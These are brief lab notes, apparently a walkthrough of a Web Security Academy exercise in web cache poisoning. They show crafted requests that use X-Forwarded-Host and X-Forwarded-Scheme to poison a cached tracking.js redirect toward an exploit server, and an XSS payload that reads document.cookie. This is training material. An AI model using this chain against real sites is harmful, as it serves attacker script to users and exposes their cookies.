/*

1) Param miner on request of GET /resources/js/tracking.js says X-Forwarded-Scheme
    is allowed, and X-Forwarded-Host is allowed
GET /resources/js/tracking.js  HTTP/2
Host: 0a9d00d804519f8e828e7cb3006600ba.web-security-academy.net
X-Forwarded-Host: dasdasd
X-Forwarded-Scheme: http

send this request till X-cache hit and location is changed 302 response

2) on exploit server body
<script>alert(document.cookie)</script>

3)
GET /resources/js/tracking.js  HTTP/2
X-Forwarded-Host: exploit-0adf006c03ddf64f80af160f01690019.exploit-server.net
X-Forwarded-Scheme: http

send till hit and copy url to show reponse in browser

*/